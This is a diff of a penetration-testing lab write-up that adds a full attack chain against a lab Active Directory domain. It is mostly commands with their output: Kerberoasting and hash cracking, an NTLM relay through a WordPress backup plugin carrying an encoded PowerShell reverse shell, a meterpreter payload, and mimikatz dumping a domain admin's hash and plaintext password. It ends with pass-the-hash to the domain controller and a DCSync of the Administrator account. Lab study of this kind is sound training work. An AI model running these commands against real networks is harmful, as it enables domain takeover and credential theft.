@@ -12,13 +12,13 @@ Once you have access to the domain controller, retrieve the NTLM hash of the dom
 ## Endpoints
 
 **192.168.x.250** - VM #6 - WINPREP  :  offsec / lab
-**192.168.x.242** - VM #3 - MAILSRV1
-**192.168.x.244** - VM #5 - WEBSRV1
-**172.16.x.240** - VM #1
-**172.16.x.243** - VM #4
-**172.16.x.241** - VM #2
+**192.168.x.242** - VM #3 - MAILSRV1   
+**192.168.x.244** - VM #5 - WEBSRV1                                         178
+**172.16.x.240** - VM #1 - DCSRV1                                               134
+**172.16.x.243** - VM #4 - CLIENTWK1
+**172.16.x.241** - VM #2 - INTERNALSRV1
 
-# Enumerating the public network
+# Enumerating the Public Network
 
 Client's provided two initial targets:
 - WEBSRV1 - **192.168.x.244**
@@ -902,7 +902,7 @@ ipconfig
 
 # Enumerating Internal
 
-### CLIENTWK1
+### CLIENTWK1 - 242
 #### Situational Awareness Local enumeration
 
 - Download **winpeas** onto the victim machine
@@ -1295,8 +1295,13 @@ In order to enumerate the internal network, we'll need to set up a SOCKS proxy O
 
 #### Ligolo-ng Tunneling
 
-- On Kali - Setup Ligolo proxy
+- On Kali - Setup Ligolo & ligolo proxy
 ```bash
+# Create a new interface
+ip tuntap add user kali mode tun ligolo
+ip link set ligolo up
+
+# Start proxy
 sudo .\proxy -selfcert -laddr 192.168.45.170:443
 ```
 
@@ -1470,4 +1475,372 @@ vim /etc/hosts
 - Goto `http://internalsrv1.beyond.com/wordpress/wp-admin`
 	- Will redirect you to a login page.
 
-- Sadly none of the 
+- Sadly none of the default creds or discovered creds will work
+
+
+# Attacking Internal WebApp
+
+### INTERNALSRV1 - 241
+
+Every time we obtain new information, we should reevaluate what we already know.
+- `daniela` has an http SPN mapped to INTERNALSRV1
+	- Can assume that `daniela` may be able to log in to the WordPress login page successfully
+- `daniela` is Kerberoastable
+	- If we can crack the TGS-REP password hash, we may be able to log in to WordPress and gain further access
+- If that fails, we can try **wpscan** or other webapp attacks
+
+#### Kerberoasting
+
+- To get the TGS-REP hash w/ **impacket**, we'll have to use a domain user (`john`)
+```bash
+impacket-GetUserSPNs -request -dc-ip 172.16.137.240 beyond.com/john
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	Password:
+	ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+	----------------------------  -------  --------  --------------------------  --------------------------  ----------
+	http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             
+	
+	
+	
+	[-] CCache file is not found. Skipping...
+	$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$0533d353ee523bdf7673062394fcd0eb$ae56fa53185163ad8320a9c2a724be782b25b03dc5c9543c48098ab139991e473486460211cb132c669adf4e8da3fbb9f6a58eb296a1bbc3e861c56d2436518809c9ddb0968bc4eb43b2b19ab16f14983033216132c33972e48865c5ce2bde24d6fe36bbc0f91d69452a4541bc711ac6bc1547c08c4c083b5598fcc05ad94ae073d2282e2518894c55f0602436525bc93933a45ad9cbbe41bf6703e3dd96ce9f4b7ba951435041d43be535868d963afec2478544f9f2f33b75d0910f9bbabb6b88ac463b695a8f415bcf5b5d7f27c945d50223f6eb1f1e108d16a5cef518736eac651c82ecf5be5fd9428cd06036f6fbeca165ed68403d61931bf1e3dfe34ad0aaefcc5836f8cf49b3301a7649f7b6705f8e18a49653d680341a32f8a0b65ab921fa9ceb9c750f202474b9b2072cd0ae712d9e1485122dde50feeeadab210e69fefcd548b00ccaa71cc8b3dcefaa614090a0509fff3c7d08891c42879389203f2b94b33ab4f2c7703d56a2bc2e74f5588ac82607c45e9635824f38993fbc2e0ded2214de9828e0052fd6ab5f1f1267045791d0baf5b31b8127955a517ed132ace2c649836eee57143bc00fc2b0b9f58a850a5d17253802d74d0640ce3bc821f4837363f0f4d1e4d8b0a8f3d65bd435cac6d1c39a8b6af28aada6ca45291a1e587b7b4734de5177c993ff1368da69750d990f915e514efbda3abc5e9bd795e8bebee77d0379ab0ac0a5cc289a4b96ae801725ec82e1ff4b84067a0169539e4e69665d25d4c4e385d8eb8eff9a73066ff1350d84b39ce8b7180357cbeaff109c7caa9365b00bc463665adc62c281df050151bc704836b4df20edd9cd62d2c09e1187855c5f48c66215d57cf8c7636b0037f19cec03b3d98a6e3099a1f492b26b46fc08548944c99c210c7ac102c3db7b89570bf33fe7b5e402b3f8e38303a1e94aa79ef014ecd589b8eaf2edc20f0f44bb37359210b6b242bed715d96b4fabb15e9475442b6bc48e295170dcd8d8cfd55e9475699f4309fe9a71428a2994c9857a28cc4f639ceeeec3142264217324e4ed2d4b826b2869d15be63add42afb64d66696d94fd30e3aaabba5268d1fc1814201a4baee2e5861d2678444ccbd53b972f68348e5e8748998aaf4cc827b750ba7b7e4572ef6c696f8b82d718c56718cc7068d3c69517f460519c1b641733a6892408ca3ce41a9329da73d699a3bba8cf35ffe538054e83b5eca52eff8bc776170dd786ce943d9a9a5c4255de3a394e457ac3403eced34e1cf3977f414611a502073abaf918fb84437daf90256373ec13e2f8ed9781e9e0e4a1d202abfcbb30d11f5945d50ddbcde42784dc423931b01c
+```
+	- store in `daniela.hash`
+
+- Crack
+```bash
+sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
+	DANIelaRO123
+	
+	Session..........: hashcat
+	Status...........: Cracked
+```
+
+> We already established that no domain user has local _Administrator_ privileges on any domain computers
+& we can't use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.
+
+- Try to login to the WP site at */wp-admin*
+	- Huzzah!!
+
+#### Abuse WP plugin for Relay Attack
+
+- Review settings and plugins of webapp
+	- **Users**
+		- daniela
+	- **Settings > General**
+		- WP Address & Site Address are the DNS names internalsrv1.beyond.com/wordpress as thought
+	- **Plugins > Installed**
+		- Akismet Anti-Spam - Disabled
+		- Backup Migration - Enabled
+			- Click **Manage** for plugin config page
+			- ![](beyond_bkupmgr_pluginconfig.png)
+			- path: `C:\xampp\htdocs\wordpress\wp-content\backup-migration-BV1emzfHrI`
+		- Hello Dolly - Disabled
+
+
+Currently two options going forward
+1. Upload a malicious plugin in order to get a reverse shell on INTERNALSRV1 &, hopefully, RCE.
+   
+2nd option requires some assumptions:
+	- According to Bloodhound, local `Administrator` account has an active session on INTERNALSRV1
+	- **Assumption** - Based on this session, we may assume that the account is used to run the WP instance.
+	- **Assumption** - Not uncommon for `Administrator` accounts have the same password across the domain
+	- Also according to Bloodhound, Domain Admin `beccy` has an active session on MAILSRV1
+	- **Assumption** - `beccy`'s creds are cached on the system
+	- As SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication.
+
+2. Force an authentication request by abusing the Backup directory path of the **Backup Migration** WordPress plugin on INTERNALSRV1
+	- Setting the destination path to our Kali machine, we can use _impacket-ntlmrelayx to relay the incoming connection to MAILSRV1
+	- If our assumptions are correct, the auth request is made in the context of the local `Administrator` account on INTERNALSRV1,
+	  which has the same password as the local `Administrator` account on MAILSRV1
+	- If successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for `beccy`
+
+> Since the second attack vector not only results in code execution on a single system,
+> but also provides a potential vector to achieve one of the goals of the penetration test, we'll perform the relay attack first
+
+
+- Setup relay
+```bash
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.181.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA2ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+# New Tab
+rlwrap nc -nlvp 9999
+```
+	- --no-http-server - Disable HTTP server
+	- -smb2support - Enable SMB2 support
+	- Specify external address for MAILSRV1 as target
+	- Specify encoded PS revshell to our Kali on port 9999
+
+
+> Using **rlwrap** will help ensure proper shell operation. 
+
+
+- Modify the Backup Directory Path of the plugin to point to our Kali and a random dir: `//192.168.45.246/test`
+- Should cause the plugin to auth to **impacket-ntlmrelayx** in the context of the user running WP
+```bash
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	[*] Protocol Client LDAPS loaded..
+	[*] Protocol Client LDAP loaded..
+	[*] Protocol Client DCSYNC loaded..
+	[*] Protocol Client SMB loaded..
+	[*] Protocol Client IMAPS loaded..
+	[*] Protocol Client IMAP loaded..
+	[*] Protocol Client RPC loaded..
+	[*] Protocol Client SMTP loaded..
+	[*] Protocol Client MSSQL loaded..
+	[*] Protocol Client HTTP loaded..
+	[*] Protocol Client HTTPS loaded..
+	[*] Running in relay mode to single host
+	[*] Setting up SMB Server
+	[*] Setting up WCF Server
+	[*] Setting up RAW Server on port 6666
+	
+	[*] Servers started, waiting for connections
+	[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.181.242, attacking target smb://192.168.181.242
+	[*] Authenticating against smb://192.168.181.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
+```
+
+- In listener tab
+```bash
+rlwrap nc -nlvp 9999
+listening on [any] 9999 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.181.242] 51153
+
+whoami
+	nt authority\system
+PS C:\Windows\system32> hostname
+	MAILSRV1
+```
+
+
+# Gaining Access to DC
+
+### MAILSRV1 - 242
+- Obtained privileged RCE on
+
+#### Cached Creds
+
+> Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system.
+> This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for `beccy`
+
+- Meterpreter - Had to use as mimikatz would freeze MAILSRV1
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.151 LPORT=5555 -f exe -o exploits/met.exe
+
+sudo msfconsole -q
+
+msf6 > use multi/handler
+	[*] Using configured payload generic/shell_reverse_tcp
+
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+	payload => windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LHOST 192.168.45.151
+	LHOST => 192.168.45.151
+
+msf6 exploit(multi/handler) > set LPORT 5555
+	LPORT => 5555
+
+msf6 exploit(multi/handler) > set ExitOnSession false
+	ExitOnSession => false
+
+msf6 exploit(multi/handler) > run -j
+	[*] Exploit running as background job 0.
+	[*] Exploit completed, but no session was created.
+	[*] Started HTTPS reverse handler on https://192.168.45.151:5555
+```
+
+- MAILSRV1
+```powershell
+.\met.exe
+```
+
+- Meterpreter
+```bash
+msf6 > multi/manage/autoroute
+
+msf6 post(multi/manage/autoroute) > sessions -i 2
+	[*] Starting interaction with 2...
+
+meterpreter > shell
+	Process 4952 created.
+	Channel 1 created.
+	Microsoft Windows [Version 10.0.20348.1006]
+	(c) Microsoft Corporation. All rights reserved.
+
+C:\users\beccy> powershell
+```
+
+- Get mimikatz on MAILSRV1
+```powershell
+iwr -uri http://192.168.45.151:8000/mimikatz.exe -outfile mimikatz.exe
+```
+
+- Attempt to extract NTLM hash or cleartext pw of `beccy`
+```powershell
+.\mimikatz.exe
+
+	  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+	Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+	...
+	Authentication Id : 0 ; 331497 (00000000:00050ee9)
+	Session           : Interactive from 1
+	User Name         : beccy
+	Domain            : BEYOND
+	Logon Server      : DCSRV1
+	Logon Time        : 4/9/2024 12:38:32 AM
+	SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
+	        msv :
+	         [00000003] Primary
+	         * Username : beccy
+	         * Domain   : BEYOND
+	         * NTLM     : f0397ec5af49971f6efbdb07877046b3
+	         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
+	         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
+	        tspkg :
+	        wdigest :
+	         * Username : beccy
+	         * Domain   : BEYOND
+	         * Password : (null)
+	        kerberos :
+	         * Username : beccy
+	         * Domain   : BEYOND.COM
+	         * Password : NiftyTopekaDevolve6655!#!
+	...
+```
+	- Got both NTLM hash and plaintext password
+
+#### Lateral Movement
+
+Technically we can use the plaintext password, however, let's pass the NTLM hash to gain access to DCSRV1
+```bash
+impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.134.240
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	[*] Requesting shares on 172.16.134.240.....
+	[*] Found writable share ADMIN$
+	[*] Uploading file NKiVORoP.exe
+	[*] Opening SVCManager on 172.16.134.240.....
+	[*] Creating service jsmp on 172.16.134.240.....
+	[*] Starting service jsmp.....
+	[!] Press help for extra shell commands
+	Microsoft Windows [Version 10.0.20348.1006]
+	(c) Microsoft Corporation. All rights reserved.
+	
+	C:\Windows\system32> whoami
+		nt authority\system
+	
+	C:\Windows\system32> hostname
+		DCSRV1
+	
+	C:\Windows\system32> ipconfig 
+		 
+		Windows IP Configuration
+		
+		
+		Ethernet adapter Ethernet0:
+		
+		   Connection-specific DNS Suffix  . : 
+		   IPv4 Address. . . . . . . . . . . : 172.16.134.240
+		   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+		   Default Gateway . . . . . . . . . : 172.16.134.254
+```
+
+- Download mimikatz and perform a dcsync on Administrator user on DCSRV1
+```powershell
+certutil.exe -urlcache -f http://192.168.45.151:8000/mimikatz.exe mimikatz.exe
+
+.\mimikatz.exe
+lsadump::dcsync /user:beyond\Administrator
+	mimikatz # [DC] 'beyond.com' will be the domain
+	[DC] 'DCSRV1.beyond.com' will be the DC server
+	[DC] 'beyond\Administrator' will be the user account
+	[rpc] Service  : ldap
+	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+	
+	Object RDN           : Administrator
+	
+	** SAM ACCOUNT **
+	
+	SAM Username         : Administrator
+	Account Type         : 30000000 ( USER_OBJECT )
+	User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+	Account expiration   : 
+	Password last change : 10/13/2022 6:18:37 AM
+	Object Security ID   : S-1-5-21-1104084343-2915547075-2081307249-500
+	Object Relative ID   : 500
+	
+	Credentials:
+	  Hash NTLM: 8480fa6ca85394df498139fe5ca02b95
+	    ntlm- 0: 8480fa6ca85394df498139fe5ca02b95
+	    ntlm- 1: a07fc8cbdda7f2d4515a6aab11da28c7
+	    lm  - 0: ba6a26fc17bd17723b09004a956c8590
+	
+	Supplemental Credentials:
+	* Primary:NTLM-Strong-NTOWF *
+	    Random Value : bc01f5d3e69ef9268807bcbf786e34b8
+	
+	* Primary:Kerberos-Newer-Keys *
+	    Default Salt : BEYOND.COMAdministrator
+	    Default Iterations : 4096
+	    Credentials
+	      aes256_hmac       (4096) : e8d0b7aa861dffd552fcfa803856fd0cdf909fa6966eb450d583a7bcaef1263f
+	      aes128_hmac       (4096) : b0c54be1f0740f4731a09152aea71669
+	      des_cbc_md5       (4096) : 677f5249132c3b68
+	    OldCredentials
+	      aes256_hmac       (4096) : 593c25cafcc1345cc4c6cb211e325ac06b41686a5b0078627ce63725b0a969f3
+	      aes128_hmac       (4096) : 553aa0a4d21dde1bc79022b19827bb73
+	      des_cbc_md5       (4096) : d3914997dfa8294f
+	
+	* Primary:Kerberos *
+	    Default Salt : BEYOND.COMAdministrator
+	    Credentials
+	      des_cbc_md5       : 677f5249132c3b68
+	    OldCredentials
+	      des_cbc_md5       : d3914997dfa8294f
+	
+	* Packages *
+	    NTLM-Strong-NTOWF
+	
+	* Primary:WDigest *
+	    01  290c9f35f8d308ce517caad823188fad
+	    02  4a5c81b76aa83a40ba3477b88f837b41
+	    03  bdff8d83ee50ba0e807b5492e7b041a0
+	    04  290c9f35f8d308ce517caad823188fad
+	    05  91f91b38e4542d5d2d6cb8fefdd48f65
+	    06  4e328abc1ce3d683b48e0a3dde03f21c
+	    07  18b760c48e0a2c7bd81980e6dac56bfe
+	    08  ad5c6178d46ba3bda9d1469a0c823c43
+	    09  b5ca9dc10303f5aa2ba7afef40517c14
+	    10  3dcb8edaae22ac9f3133a062e9ab7cc2
+	    11  c0debaabf591f241d2afdbde7a323ef0
+	    12  ad5c6178d46ba3bda9d1469a0c823c43
+	    13  a6291c55f97cacd7e421b0d73e1c67da
+	    14  9578af8daece8dce81b4a5095371a80b
+	    15  5257cd6abc3064a0c1da468c2ea1d92c
+	    16  5e023ab0283d0052a9849844c063291e
+	    17  316de794086098880cb44cecf4de3151
+	    18  de04d98735990f190e3ecd5ba4119dfb
+	    19  7c02cece16fc896082acf187500291b5
+	    20  bd4f04838065451e1d051905583de21e
+	    21  647d56e1f298e5d40d0c5451dddbf576
+	    22  3c49fd98484aef9f92eb3471488ab445
+	    23  e9b7a94ff81039e77560d86f021bdeb8
+	    24  00b6332ef3afbeb768c0ddf336b179f3
+	    25  e3889b9852ac978ee6d7796c37433e72
+	    26  a56bb124b942764ad96d06314b892550
+	    27  fb36c420b43676895f8319328cd2d97b
+	    28  da56b1ea3368c4ec27c8fbb82c2e63bb
+	    29  3bb1559c5107551743a709fcf6802fe8
+```
